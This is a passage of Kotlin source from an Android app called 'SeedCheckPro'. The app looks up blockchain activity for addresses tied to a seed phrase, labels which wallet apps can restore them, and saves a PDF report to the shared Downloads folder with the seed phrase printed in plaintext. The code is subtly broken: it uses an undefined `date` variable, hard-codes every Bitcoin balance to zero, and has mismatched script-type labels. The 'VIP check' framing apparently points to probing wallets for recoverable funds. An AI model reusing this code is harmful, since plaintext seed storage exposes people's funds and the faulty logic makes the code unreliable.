                    builder.append(String.format(Locale.US, "TOTAL VALUE: $%.2f USD\n", totalusd))
                    builder.append("Last TX: ${btcDetails.lastTx.take(18)}...\n")
                    builder.append("Script Type: ${btcDetails.scriptType}\n")
                    builder.append("Compatible wallet: $walletCompat\n\n")

                }
            }

            AlertDialog.Builder(this@MainActivity)
                .setTitle("VIP Check Result")
                .setMessage(builder.toString())
                .setPositiveButton("OK", null)
                .show()
        }
    }

    suspend fun getCurrentBtcPrice(): Double = withContext(Dispatchers.IO) {
        try {
            val request = Request.Builder()
                .url("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd")
                .build()
            val response = client.newCall(request).execute()
            val json = JSONObject(response.body?.string().orEmpty())
            json.getJSONObject("bitcoin").getDouble("usd")
        } catch (e: Exception) {
            0.0
        }
    }


    data class BtcDetails(
        val address: String,
        val balance: Double,
        val walletType: String,
        val totalReceived: Double,
        val totalSent: Double,
        val txCount: Int,
        val firstSeen: String,
        val lastTx: String,
        val scriptType: String
    )
    data class EthDetails(
        val address: String,
        val balance: Double,
        val txCount: Int,
        val totalReceived: Double,
        val totalSent: Double,
        val walletType: String,
        val firstSeen: String,
        val lastTxHash: String,
        val txList: List<Pair<String, String>>
    )


    private suspend fun fetchBtcFullDetails(address: String): BtcDetails = withContext(Dispatchers.IO) {
        try {
            val url = "https://blockstream.info/api/address/$address"
            val request = Request.Builder().url(url).build()
            val response = client.newCall(request).execute()
            val json = JSONObject(response.body?.string().orEmpty())

            val chain = json.optJSONObject("chain_stats")
            val mempool = json.optJSONObject("mempool_stats")

            val totalReceived = ((chain?.optLong("funded_txo_sum") ?: 0L) + (mempool?.optLong("funded_txo_sum") ?: 0L)) / 1e8
            val totalSent = ((chain?.optLong("spent_txo_sum") ?: 0L) + (mempool?.optLong("spent_txo_sum") ?: 0L)) / 1e8
            val txCount = (chain?.optInt("tx_count") ?: 0) + (mempool?.optInt("tx_count") ?: 0)

            val lastTxUrl = "https://blockstream.info/api/address/$address/txs"
            val lastTxReq = Request.Builder().url(lastTxUrl).build()
            val lastTxResp = client.newCall(lastTxReq).execute()
            val lastTxArray = JSONArray(lastTxResp.body?.string().orEmpty())
            val lastTxHash = if (lastTxArray.length() > 0)
                lastTxArray.getJSONObject(0).optString("txid", "N/A")
            else
                "N/A"

            val scriptType = when {
                address.startsWith("1") -> "pubkeyhash"
                address.startsWith("3") -> "scripthash"
                address.startsWith("bc1q") -> "segwit"
                address.startsWith("bc1p") -> "taproot"
                else -> "unknown"
            }

            return@withContext BtcDetails(
                address = address,
                balance = 0.0,
                walletType = detectWalletByScriptType(scriptType),
                totalReceived = totalReceived,
                totalSent = totalSent,
                txCount = txCount,
                firstSeen = "N/A",
                lastTx = lastTxHash,
                scriptType = scriptType
            )
        } catch (e: Exception) {
            return@withContext BtcDetails(
                address = address,
                balance = 0.0,
                walletType = "unknown",
                totalReceived = 0.0,
                totalSent = 0.0,
                txCount = 0,
                firstSeen = "N/A",
                lastTx = "N/A",
                scriptType = "unknown"
            )
        }
    }









    private suspend fun fetchBtcTransactionCount(address: String): Int = withContext(Dispatchers.IO) {
        try {
            val url = "https://api.blockchair.com/bitcoin/dashboards/address/$address"
            val request = Request.Builder().url(url).build()
            val response = client.newCall(request).execute()
            val json = JSONObject(response.body?.string().orEmpty())
            json.optJSONObject("data")
                ?.optJSONObject(address)
                ?.optJSONObject("address")
                ?.optInt("transaction_count") ?: 0
        } catch (e: Exception) {
            0
        }
    }

    data class Erc20Token(val symbol: String, val balance: String)

    suspend fun fetchErc20Tokens(address: String): List<Erc20Token> = withContext(Dispatchers.IO) {
        try {
            val url = "https://api.ethplorer.io/getAddressInfo/$address?apiKey=freekey"
            val request = Request.Builder().url(url).build()
            val response = client.newCall(request).execute()
            val json = JSONObject(response.body?.string().orEmpty())
            val tokens = json.optJSONArray("tokens") ?: return@withContext emptyList<Erc20Token>()
            val result = mutableListOf<Erc20Token>()
            for (i in 0 until tokens.length()) {
                val token = tokens.getJSONObject(i)
                val tokenInfo = token.getJSONObject("tokenInfo")
                val symbol = tokenInfo.optString("symbol", "???")
                val decimals = tokenInfo.optString("decimals")?.toIntOrNull() ?: 18
                val balanceRaw = token.opt("balance")?.toString()?.toBigDecimalOrNull() ?: BigDecimal.ZERO
                val balance = balanceRaw.divide(BigDecimal.TEN.pow(decimals))
                if (balance > BigDecimal.ZERO) {
                    result.add(Erc20Token(symbol, balance.stripTrailingZeros().toPlainString()))
                }
            }
            result
        } catch (e: Exception) {
            emptyList()
        }
    }


    data class EthTx(val hash: String, val from: String, val to: String, val value: String, val date: String)

    private suspend fun fetchEthTransactions(address: String): List<EthTx> = withContext(Dispatchers.IO) {
        val apiKeys = listOf(
            "Your etherscan Api",
            "Your etherscan Api"
        )

        val txs = mutableListOf<EthTx>()

        for (apiKey in apiKeys) {
            try {
                val url = "https://api.etherscan.io/api?module=account&action=txlist&address=$address&sort=desc&apikey=$apiKey"
                val request = Request.Builder().url(url).build()
                val response = client.newCall(request).execute()

                if (!response.isSuccessful) continue

                val json = JSONObject(response.body?.string().orEmpty())
                val result = json.optJSONArray("result") ?: continue

                for (i in 0 until minOf(result.length(), 3)) {
                    val tx = result.getJSONObject(i)
                    val timestamp = tx.getLong("timeStamp") * 1000
                    val eth = tx.getString("value").toBigDecimal().divide(BigDecimal("1e18"), 8, RoundingMode.HALF_UP).toPlainString()

                    txs.add(
                        EthTx(
                            hash = tx.getString("hash"),
                            from = tx.getString("from"),
                            to = tx.getString("to"),
                            value = eth,
                            date = date
                        )
                    )
                }

                return@withContext txs
            } catch (e: Exception) {
                continue
            }
        }

        return@withContext emptyList()
    }
    private fun detectWalletByAddress(address: String): String {
        return when {
            address.startsWith("1") -> "Restorable with: Blockchain.com, Electrum (BIP44)"
            address.startsWith("3") -> "Restorable with: Electrum (BIP49), Wasabi, Coinomi"
            address.startsWith("bc1q") -> "Restorable with: Trust Wallet, BlueWallet, Sparrow, Electrum (BIP84)"
            else -> "Unknown compatibility"
        }
    }
    private fun generatePdfReport(
        mnemonic: String,
        btcDetailsList: List<BtcDetails>,
        ethDetailsList: List<EthDetails>
    ) {
        val pdfDocument = PdfDocument()
        val paint = Paint()
        val titlePaint = Paint()
        val pageWidth = 595
        val pageHeight = 842
        val margin = 40f
        val lineSpacing = 16f




        fun newPage(yStart: Float): Triple<PdfDocument.Page, Canvas, Float> {
            val pageNumber = pdfDocument.pages.size + 1
            val pageInfo = PdfDocument.PageInfo.Builder(pageWidth, pageHeight, pageNumber).create()
            val page = pdfDocument.startPage(pageInfo)
            val canvas = page.canvas

            titlePaint.textSize = 18f
            titlePaint.isFakeBoldText = true
            canvas.drawText("SeedCheckPro", margin, 50f, titlePaint)

            titlePaint.textSize = 12f
            titlePaint.isFakeBoldText = false
            canvas.drawText("FULL TRANSACTION REPORT", margin, 70f, titlePaint)
            canvas.drawText("Generated: ${SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())}", margin, 88f, titlePaint)

            return Triple(page, canvas, yStart)
        }

        var (page, canvas, y) = newPage(110f)

        paint.textSize = 10f
        canvas.drawText("Seed Phrase:", margin, y, paint)
        y += lineSpacing
        val seedLines = mnemonic.chunked(90)
        seedLines.forEach {
            canvas.drawText(it, margin + 20f, y, paint)
            y += lineSpacing
        }
        y += 10f

        fun drawLine(label: String, value: String) {
            val full = String.format("%-18s : %s", label, value)
            val wrappedLines = full.chunked(100)
            for (line in wrappedLines) {
                canvas.drawText(line, margin, y, paint)
                y += lineSpacing
            }
        }

        fun checkPageEnd() {
            if (y > pageHeight - 80f) {
                pdfDocument.finishPage(page)
                val new = newPage(110f)
                page = new.first
                canvas = new.second
                y = new.third
            }
        }

        for (btc in btcDetailsList) {
            checkPageEnd()
            canvas.drawText("--- BITCOIN REPORT ---", margin, y, paint)
            y += lineSpacing
            drawLine("Address", btc.address)
            drawLine(label = "Balance", "%.8f BTC".format(btc.balance))
            drawLine(label = "Total Received", "%.8f BTC".format(btc.totalReceived))
            drawLine(label = "Total Sent", "%.8f BTC".format(btc.totalSent))
            drawLine("Tx Count", btc.txCount.toString())
            drawLine("Script Type", btc.scriptType)
            drawLine("Wallet Type", btc.walletType)
            drawLine("Last TX Hash", btc.lastTx)
            y += lineSpacing
        }

        for (eth in ethDetailsList) {
            checkPageEnd()
            canvas.drawText("--- ETHEREUM REPORT ---", margin, y, paint)
            y += lineSpacing
            drawLine("Address", eth.address)
            drawLine("Balance", "%.8f ETH".format(fixEthBalanceOnly(eth.balance)))
            drawLine("Total Received", String.format(Locale.US, "%.8f ETH", eth.totalReceived))
            drawLine("Total Sent", String.format(Locale.US, "%.8f ETH", eth.totalSent))
            drawLine("Tx Count", eth.txCount.toString())
            drawLine("Wallet Type", eth.walletType)
            drawLine("First Seen", eth.firstSeen)
            drawLine("Last TX Hash", eth.lastTxHash)

            if (eth.txList.isNotEmpty()) {
                y += 5f
                canvas.drawText("Tx History:", margin + 10f, y, paint)
                y += lineSpacing
                for ((hash, desc) in eth.txList) {
                    checkPageEnd()
                    val line = "- $hash : $desc"
                    val wrapped = line.chunked(100)
                    for (wrap in wrapped) {
                        canvas.drawText(wrap, margin + 20f, y, paint)
                        y += lineSpacing
                        checkPageEnd()
                    }
                }
            }
            y += lineSpacing
        }

        pdfDocument.finishPage(page)

        val fileName = "SeedCheckPro_Report_${System.currentTimeMillis()}.pdf"
        val contentValues = ContentValues().apply {
            put(MediaStore.Downloads.DISPLAY_NAME, fileName)
            put(MediaStore.Downloads.MIME_TYPE, "application/pdf")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                put(MediaStore.Downloads.IS_PENDING, 1)
            }
        }

        val resolver = applicationContext.contentResolver
        val collection = MediaStore.Downloads.getContentUri(MediaStore.VOLUME_EXTERNAL_PRIMARY)
        val itemUri = resolver.insert(collection, contentValues)

        if (itemUri != null) {
            resolver.openOutputStream(itemUri)?.use { outputStream ->
                pdfDocument.writeTo(outputStream)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                contentValues.clear()
                contentValues.put(MediaStore.Downloads.IS_PENDING, 0)
                resolver.update(itemUri, contentValues, null, null)
            }
            Toast.makeText(this, "PDF saved to Downloads", Toast.LENGTH_LONG).show()
        } else {
            Toast.makeText(this, "Failed to save PDF", Toast.LENGTH_LONG).show()
        }

        pdfDocument.close()
    }





    fun detectWalletByScriptType(type: String): String {
        return when (type) {
            "pubkeyhash" -> "Legacy (Electrum, BlueWallet, Ledger, Trezor, Exodus, TrustWallet, etc.)"
            "scripthash" -> "BIP49 (Electrum, BlueWallet, Samourai, Wasabi, etc.)"
            "witness_v0_keyhash" -> "BIP84 (BlueWallet, Electrum, Wasabi, Ledger, Trezor, Sparrow, etc.)"
            "witness_v1_taproot" -> "BIP86 Taproot (Sparrow, Electrum, Ledger, Trezor, etc.)"
            "segwit" -> "BIP84 (Electrum, BlueWallet, Wasabi, Ledger, Trezor, Sparrow, etc.)"
            else -> "Unknown compatibility"
        }
    }

}
